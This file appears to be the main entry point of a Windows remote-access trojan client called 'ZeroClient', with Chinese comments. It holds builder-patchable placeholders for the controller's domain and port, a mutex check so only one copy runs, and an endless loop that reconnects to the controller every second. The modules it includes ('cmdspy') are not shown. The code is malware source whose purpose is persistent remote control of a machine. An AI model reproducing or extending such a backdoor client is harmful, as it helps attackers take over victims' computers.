#include <winsock2.h>
#include <windows.h>
#include <iostream>
#include "zeroclient.h"
#include "cmdspy.h"

// 在服务端创建客户端时，可以自定义客户端连向的域名和端口
const int gOffsetDomain = 10;
const char gDomain[100] = "DNSDNSDNS:127.0.0.1 ";
const int gOffsetPort = 13;
const char gPort[100] = "PORTPORTPORT:18000 ";

int APIENTRY WinMain(HINSTANCE hInstance,
                     HINSTANCE hPrevInstance,
                     LPSTR     lpCmdLine,
                     int       nCmdShow)
{
    // 檢查窗口是否有重複
    char szFile[MAX_PATH],*szPt;

    GetModuleFileNameA(NULL,szFile,MAX_PATH);
    szPt = szFile + strlen(szFile);
    while(*--szPt != '\\') ;

    CreateMutexA(NULL,FALSE,szPt + 1);
    if(GetLastError() == ERROR_ALREADY_EXISTS) {
        std::cout << "Same program already running" << std::endl;
        return -1;
    }

    // 初始化Windows socket功能，要在Windows使用网络必须初始化这个
    WSAData wsaData;
    if (WSAStartup(MAKEWORD(2,1), &wsaData)) {
        std::cout << "Failed to initialize WSA" << std::endl;
        return -1;
    }

    // 主循环
    ZeroClient client;
    client.hInst = hInstance;
    while (1) {
        // 如果断开了，隔一秒自动连接
		char domain[100] = {0};
		char *domainStartPos = (char*)gDomain+gOffsetDomain;
		char *domainStopPos = strchr(domainStartPos, ' ');
		memcpy(domain, domainStartPos, domainStopPos-domainStartPos);
        client.connectTo(domain, atoi(gPort+gOffsetPort));
        Sleep(1000);
    }

    // 程序完结后释放WSA
    WSACleanup();

    return 0;
}
